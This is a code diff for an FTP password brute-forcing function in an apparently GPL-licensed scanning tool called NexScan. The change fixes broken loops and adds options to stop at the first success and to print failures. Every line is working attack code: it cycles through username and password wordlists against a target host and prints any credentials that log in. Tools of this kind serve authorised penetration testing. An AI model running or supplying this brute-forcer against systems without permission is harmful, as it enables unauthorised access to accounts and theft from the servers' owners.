@@ -11,39 +11,55 @@ NexScan is distributed in the hope that it will be useful, but WITHOUT ANY WARRA
 
 from ftplib import FTP
 
-def bruteFTP(host, userfile, passfile, user=None, password=None):
+def bruteFTP(host, userfile, passfile, user=None, password=None, verbose=False, stop_on_success=False):
     print(f"\nAttacking ftp://{host}....\n")
     try:
-        if passfile and user:
+        # Case where both user and password are provided directly
+        if user and password:
+            try:
+                ftp = FTP(host)
+                ftp.login(user, password)
+                print(f'\033[92m [+]\033[0m {user} : {password}')
+                ftp.quit()
+            except Exception as e:
+                if verbose:
+                    print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')
+
+        # Case where password file and a single user is provided
+        elif passfile and user:
             with open(passfile, 'r') as f:
                 passwords = f.readlines()
             for password in passwords:
                 password = password.strip()
-                ftp = FTP(host)
                 try:
+                    ftp = FTP(host)
                     ftp.login(user, password)
-                    print(f'\033[92m [+]\033[0m {user} : ', password)
-                    break
-
+                    print(f'\033[92m [+]\033[0m {user} : {password}')
+                    ftp.quit()
+                    if stop_on_success:
+                        return
                 except Exception as e:
-                    # If login fails, print error message
-                    print(f'\033[91m [-]\033[0m {user} : ', password)
+                    if verbose:
+                        print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')
 
+        # Case where user file and single password is provided
         elif userfile and password:
             with open(userfile, 'r') as f:
                 users = f.readlines()
             for user in users:
                 user = user.strip()
-                ftp = FTP(host)
                 try:
+                    ftp = FTP(host)
                     ftp.login(user, password)
-                    print(f'\033[92m [+]\033[0m {user} : ', password)
-                    break
-
+                    print(f'\033[92m [+]\033[0m {user} : {password}')
+                    ftp.quit()
+                    if stop_on_success:
+                        return
                 except Exception as e:
-                    # If login fails, print error message
-                    print(f'\033[91m [-]\033[0m {user} : ', password)
+                    if verbose:
+                        print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')
 
+        # Case where both user file and password file are provided
         elif userfile and passfile:
             with open(userfile, 'r') as f:
                 users = f.readlines()
@@ -53,19 +69,17 @@ def bruteFTP(host, userfile, passfile, user=None, password=None):
                 user = user.strip()
                 for password in passwords:
                     password = password.strip()
-                    ftp = FTP(host)
-                try:
-                    ftp.login(user, password)
-                    print(f'\033[92m [+]\033[0m {user} : ', password)
-                    break
-
-                except Exception as e:
-                    # If login fails, print error message
-                    print(f'\033[91m [-]\033[0m {user} : ', password)
-
-        
+                    try:
+                        ftp = FTP(host)
+                        ftp.login(user, password)
+                        print(f'\033[92m [+]\033[0m {user} : {password}')
+                        ftp.quit()
+                        if stop_on_success:
+                            return
+                    except Exception as e:
+                        if verbose:
+                            print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')
 
     except KeyboardInterrupt:
         print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
         exit(1)
-
